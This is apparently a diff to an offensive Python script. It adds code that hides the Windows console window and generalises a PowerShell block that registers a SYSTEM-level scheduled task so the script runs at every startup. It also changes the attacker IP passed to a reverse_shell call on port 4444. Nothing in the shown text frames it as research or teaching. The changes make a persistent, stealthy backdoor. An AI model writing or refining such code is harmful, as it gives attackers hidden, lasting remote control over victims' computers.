@@ -4,6 +4,13 @@ import socket
 import sys
 import time
 import platform
+import ctypes
+
+# Function to hide the console window
+def hide_window():
+    # Only hide window if the platform is Windows
+    if platform.system() == "Windows":
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def make_persistent():
     # Get the path to the Python executable and the current script
@@ -12,7 +19,7 @@ def make_persistent():
 
     # Use raw strings to avoid issues with backslashes in paths
     powershell_script = rf'''
-    $action = New-ScheduledTaskAction -Execute "C:\Users\rubenoltean\AppData\Local\Programs\Python\Python312\python.exe" -Argument "script.py"
+    $action = New-ScheduledTaskAction -Execute "{python_path}" -Argument "{script_path}"
     $trigger = New-ScheduledTaskTrigger -AtStartup
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
     Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "PersistentPythonScript_Startup" -Description "Runs the Python script at system startup" -Force
@@ -82,6 +89,9 @@ def reverse_shell(attacker_ip, attacker_port):
 
 # Main function
 if __name__ == "__main__":
+    # Hide the console window
+    hide_window()
+
     # Install any missing dependencies
     install_dependencies()
 
@@ -96,7 +106,7 @@ if __name__ == "__main__":
     print("Running the main part of the script...")
 
     # IP and port for the reverse shell
-    attacker_ip = '10.211.55.24'  # Replace with actual IP
+    attacker_ip = '192.168.1.100'  # Replace with actual IP
     attacker_port = 4444  # Port for the reverse shell
 
     reverse_shell(attacker_ip, attacker_port)
